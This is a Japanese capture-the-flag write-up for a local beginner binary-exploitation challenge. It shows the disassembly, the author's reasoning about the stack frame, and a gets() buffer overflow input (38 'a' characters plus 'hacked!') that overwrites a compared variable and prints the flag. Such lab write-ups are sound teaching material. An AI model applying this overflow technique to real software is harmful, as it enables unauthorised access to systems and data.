# first 

## access

```
nc localhost 4101
```

## solve

```python
from pwn import *

io = remote("0.0.0.0", 4101)
```
この問題解いててスタックフレームについての誤解が解けた
sub rsp,0x30でローカル変数のエリアを確保
変数は\*sと\*s2があって、\*s2は0038(0x30 - 0xa)から0x30(0048)までで、
\*sは0038までのエリア。

           ; var char *s @ rbp-0x30
│           ; var char \*s2 @ rbp-0xa
│           0x004011ed      f30f1efa       endbr64
│           0x004011f1      55             push rbp
│           0x004011f2      4889e5         mov rbp, rsp
│           0x004011f5      4883ec30       sub rsp, 0x30
見るからにflagを呼んでくれそうなread_flagがあってその手前でjampしてる。
jneを調べると等しくないと飛ぶらしい。
ででで、なにかcmpしてるなって気づく。
よく見たら、第一引数のrdiにstr.hacked入れてるじゃんってなる。
第二引数のrsiにはs2が入ってるなってことにも気づく。
getsはsに対して行っているのでsを溢れさせてs2の域にhacked!って書けばよさげ??


│           0x00401216      e8b5feffff     call sym.imp.gets           ; char *gets(char *s)
│           0x0040121b      488d45f6       lea rax, [s2]
│           0x0040121f      4889c6         mov rsi, rax                ; const char *s2
│           0x00401222      488d3dfd0d00.  lea rdi, str.hacked         ; 0x402026 ; "hacked!"t char *s1
│           0x00401229      e892feffff     call sym.imp.strcmp         ; int strcmp(const chaconst char \*s2)
│           0x0040122e      85c0           test eax, eax
│       ┌─< 0x00401230      750a           jne 0x40123c
│       │   0x00401232      b800000000     mov eax, 0
│       │   0x00401237      e89affffff     call sym.read_flag
│       │   ; CODE XREF from main @ 0x401230
│       └─> 0x0040123c      488d45d0       lea rax, [s]

python3 -c "print('a'\*(0x30 - 0xa))"
aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa←こぴーして

[vagrant@fedora32 challenge]$ nc localhost 4101
What's your name?
> aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaahacked!
flag{Y0u_kn0w_st4ck_0v3r_wr1t3}

aのあとにhacked!ってつけたら出来上がり！！
今回の教訓は
 ; var char \*s @ rbp-0x30
 ; var char \*s2 @ rbp-0xa
これは同じスタックフレーム内の話なんだよってこと。
てっきり、0x30のしたに0xaが伸びると誤解してしまってた。
(よく見ればrdp - って書いてあるじゃん…ｗ)
